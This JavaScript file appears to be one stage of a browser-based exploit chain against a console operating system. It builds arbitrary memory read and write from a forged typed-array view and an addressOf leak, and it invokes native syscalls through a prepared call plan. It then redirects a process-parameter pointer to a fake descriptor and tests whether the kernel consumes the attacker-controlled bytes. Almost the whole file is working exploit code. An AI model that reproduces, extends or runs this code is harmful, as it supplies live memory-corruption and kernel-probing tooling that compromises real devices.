// ProcParam pointer-redirection probe. The writable root page holds
// POINTERS to read-only descriptor sub-structures (+0x38 target = the
// 0xa8/0x0e/0x88 descriptor). mut3 proved the target page is RO, but
// the pointer itself lives in the WRITABLE root. If any kernel path
// consumes the descriptor through the root pointer, redirecting it to
// a fake structure in our frame feeds the consumer OUR bytes.
// Stage 1 (identical): redirect +0x38 to a frame copy of the ORIGINAL
// 96 descriptor bytes — behavior should be neutral; process surviving
// with unchanged oracles validates the redirect mechanism.
// Stage 2 (mutated): same redirect, but the fake copy's first u32
// (0xa8 descriptor size?) -> 0x10, and oracles re-run: any deviation
// = kernel consumes redirected content.
// Oracle set: 585, 606, 601, 615, 600, 603, 604, 611, 613.
// Restore: original pointer written back + verified after each stage.
// Markers 8 of 8. Process-local risk.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys598 !== "number")
    throw new Error("held_plan_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function writeAt(addressValue, bytes) {
    if (!Number.isSafeInteger(addressValue) ||
        addressValue % 8 !== 0 ||
        !bytes || bytes.length !== 8)
      throw new Error("write_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      for (var w = 0; w < 8; w++) carrier[w] = bytes[w];
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function same(left, right) {
    if (!left || !right || left.length !== right.length) return false;
    for (var n = 0; n < left.length; n++)
      if (left[n] !== right[n]) return false;
    return true;
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function u32At(bytes, off) {
    return ((bytes[off]) | (bytes[off + 1] << 8) |
            (bytes[off + 2] << 16) | (bytes[off + 3] << 24)) >>> 0;
  }
  function u64At(bytes, off) {
    return u32At(bytes, off) + u32At(bytes, off + 4) * 0x100000000;
  }
  function u32Bytes(value) {
    return [value & 255, (value >>> 8) & 255,
            (value >>> 16) & 255, (value >>> 24) & 255];
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("prr_preflight");
  phase = "call_598";
  var sizePtrOff = 0x1e00, bufOff = 0x200;
  var rootBufAddr = plan.addresses.frame + bufOff;
  var sizeAddr = plan.addresses.frame + sizePtrOff;
  var fv = new DataView(plan.frame.buffer);
  var sizeOrig = fv.getUint32(sizePtrOff, true);
  fv.setUint32(sizePtrOff, 0x1000, true);
  fv.setUint32(sizePtrOff + 4, 0, true);
  var call598 = native.call("sys598", [rootBufAddr, sizeAddr]);
  fv.setUint32(sizePtrOff, sizeOrig, true);
  if (call598.value !== 0)
    throw new Error("call598_failed");
  var rootBase = fv.getUint32(bufOff + 4, true) * 0x100000000 +
    fv.getUint32(bufOff, true);
  mark("prr_598ok");
  phase = "snapshot";
  var snap = readAt(rootBase, 192);
  if (snap[8] !== 0x4f || snap[9] !== 0x52 ||
      snap[10] !== 0x42 || snap[11] !== 0x49)
    throw new Error("orbis_magic_missing");
  var orig38slot = snap.slice(0x38, 0x40);
  var ss38 = u64At(snap, 0x38);
  if (ss38 % 8 !== 0)
    throw new Error("substruct_unaligned");
  var descOrig = readAt(ss38, 96);
  // Fake descriptor: frame at 0x1800 (8-aligned), copy of the original
  var fakeOff = 0x1800, fakeLen = 96;
  var fakeGuard = fakeOff + fakeLen;
  if (fakeGuard + 0x40 > plan.frame.length)
    throw new Error("frame_region_too_small");
  var fakeAddress = plan.addresses.frame + fakeOff;
  for (var fc = 0; fc < fakeLen; fc++)
    plan.frame[fakeOff + fc] = descOrig[fc];
  var fakeOrig = Array.from(plan.frame.subarray(fakeOff,
    fakeOff + fakeLen));
  mark("prr_fake_ready");
  function oracleSet() {
    var out = [];
    var names = ["sys585", "sys606", "sys601", "sys615",
      "sys600", "sys603", "sys604", "sys611", "sys613"];
    for (var i = 0; i < names.length; i++) {
      var c = native.call(names[i], [0, 0, 0, 0, 0, 0]);
      var e = (c.value === -1) ? native.readErrno() : null;
      out.push(names[i].slice(3) + "=" + c.value +
        (e === null ? "" : "e" + e));
    }
    return out.join(";");
  }
  var lines = ["base:" + oracleSet()];
  // Stage 1: redirect to IDENTICAL fake copy
  phase = "redirect_identical";
  writeAt(rootBase + 0x38, pointerBytes(fakeAddress));
  if (!same(readAt(rootBase + 0x38, 8), pointerBytes(fakeAddress)))
    throw new Error("redirect1_readback_failed");
  var oIdent = oracleSet();
  lines.push("identical:" + oIdent);
  // restore pointer
  writeAt(rootBase + 0x38, orig38slot);
  if (!same(readAt(rootBase + 0x38, 8), orig38slot))
    throw new Error("restore1_failed");
  mark("prr_identical_ok");
  // Stage 2: mutate the fake copy's first u32 (0xa8 -> 0x10), redirect
  phase = "redirect_mutated";
  plan.frame[fakeOff] = 0x10;
  plan.frame[fakeOff + 1] = 0;
  plan.frame[fakeOff + 2] = 0;
  plan.frame[fakeOff + 3] = 0;
  writeAt(rootBase + 0x38, pointerBytes(fakeAddress));
  if (!same(readAt(rootBase + 0x38, 8), pointerBytes(fakeAddress)))
    throw new Error("redirect2_readback_failed");
  var oMut = oracleSet();
  lines.push("mutated:" + oMut);
  // restore pointer
  writeAt(rootBase + 0x38, orig38slot);
  if (!same(readAt(rootBase + 0x38, 8), orig38slot))
    throw new Error("restore2_failed");
  mark("prr_mutated_ok");
  // Final verify: descriptor content untouched at the real page, root
  var finalDesc = readAt(ss38, 8);
  var descOk = same(finalDesc, descOrig.slice(0, 8));
  var finalRoot = readAt(rootBase + 0x38, 8);
  var rootOk = same(finalRoot, orig38slot);
  var after = native.call("getpid", []);
  mark("prr_done");
  result = { id: "procparam_redirect_v1",
    status: (after.value === before.value && after.high === 0 &&
      descOk && rootOk) ? "pass" : "fail",
    details: { root_base: rootBase.toString(16),
      fake_addr: fakeAddress.toString(16),
      lines: lines.join(" | ").slice(0, 470),
      desc_intact: descOk ? 1 : 0,
      root_intact: rootOk ? 1 : 0,
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "procparam_redirect_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
